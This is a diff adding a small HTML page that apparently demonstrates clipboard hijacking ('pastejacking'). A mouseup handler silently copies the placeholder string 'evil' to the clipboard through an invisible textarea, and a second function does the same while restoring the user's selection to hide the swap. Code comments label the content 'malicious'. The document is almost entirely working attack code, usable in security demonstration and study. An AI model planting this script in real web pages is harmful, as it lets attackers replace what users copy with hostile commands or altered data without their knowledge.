@@ -1,0 +1,57 @@
+<html>
+<body>
+	<p>0123456789</p>
+
+	<script>
+		/* Select from realtext and the script puts content from hack to clipboard */
+		document.addEventListener('mouseup', function() {
+			copyToClipboard("evil");
+		});
+
+		// Does not restore selection
+		function copyToClipboard(text) {
+			var textArea = document.createElement('textarea');
+			textArea.style.opacity = 0;
+			textArea.value = text;
+			document.body.appendChild(textArea);
+			textArea.select();
+			document.execCommand('copy');
+			document.body.removeChild(textArea);
+		}
+
+		// Restores selection
+		function copyToClipboard2(text) {
+			var range;
+
+			var hack = document.createElement('textarea');
+			hack.style.opacity = 0;
+			hack.innerHTML = text;
+			document.body.appendChild(hack);
+
+			if (document.body.createTextRange) {
+				range = document.body.createTextRange();
+				range.moveToElement(hack);
+				range.select();
+				document.execCommand('copy');
+			}
+			else if (window.getSelection) {
+				// Backup selection
+				var selectionBackup = window.getSelection().getRangeAt(0);
+
+				// Select malicious and copy to clipboard
+				range = document.createRange();
+				range.selectNodeContents(hack);
+				window.getSelection().removeAllRanges();
+				window.getSelection().addRange(range);
+
+				document.execCommand('copy');
+
+				// Restore selection
+				window.getSelection().removeAllRanges();
+				window.getSelection().addRange(selectionBackup);
+			}
+			document.body.removeChild(hack);
+		}
+	</script>
+</body>
+</html>
